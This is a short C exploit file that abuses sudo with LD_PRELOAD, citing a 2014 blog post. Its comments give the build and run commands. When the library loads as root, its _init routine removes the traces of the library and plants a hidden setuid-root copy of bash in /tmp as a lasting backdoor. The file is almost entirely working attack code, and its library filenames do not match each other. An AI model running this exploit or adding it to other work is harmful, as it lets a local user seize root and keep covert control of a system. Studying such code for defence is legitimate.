//https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
//gcc -static -o exploit1.o -c exploit1.c -fPIC
//gcc -shared -Wl,-soname,libexploit1.so.1 -o /tmp/libexploit1.so.1.0 exploit1.o -nostartfiles
//sudo LD_PRELOAD=/tmp/libxoxo.so.1.0 /etc/init.d/sshd blaaah

#include <unistd.h>
#include <stdlib.h>

void _init()
{
 if (!geteuid()) {
   unsetenv("LD_PRELOAD");
   unlink("/tmp/libxoxo.so.1.0");
   setgid(0);
   setuid(0);
   execl("/bin/sh","sh","-c","cp /bin/bash /tmp/.bash; chown 0:0 /tmp/.bash; /bin/chmod +xs /tmp/.bash",NULL);
 }
}
